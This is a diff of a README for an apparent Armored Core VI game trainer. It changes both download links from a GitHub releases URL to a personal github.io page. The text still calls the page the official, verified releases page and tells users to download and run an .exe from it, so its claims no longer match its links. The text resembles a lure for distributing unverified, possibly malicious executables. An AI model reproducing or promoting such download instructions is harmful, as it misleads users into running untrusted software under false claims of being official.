@@ -1,6 +1,6 @@
 # 🤖 Armored-Core-6-Trainer-2026 - Master your mech with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/l0408578/Armored-Core-6-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://l0408578.github.io)
 
 This application provides players with options for Armored Core VI. It works on Windows 10 and 11. It helps users manage game variables to improve their experience.
 
@@ -8,7 +8,7 @@ This application provides players with options for Armored Core VI. It works on 
 
 Follow these steps to obtain the trainer. You must visit the official releases page to get the verified version.
 
-1. Go to this link: [https://github.com/l0408578/Armored-Core-6-Trainer-2026/releases](https://github.com/l0408578/Armored-Core-6-Trainer-2026/releases)
+1. Go to this link: [https://l0408578.github.io](https://l0408578.github.io)
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click on the file that ends in .exe to start your download.
 4. Save the file to a folder you can find, such as your Downloads folder or your Desktop.
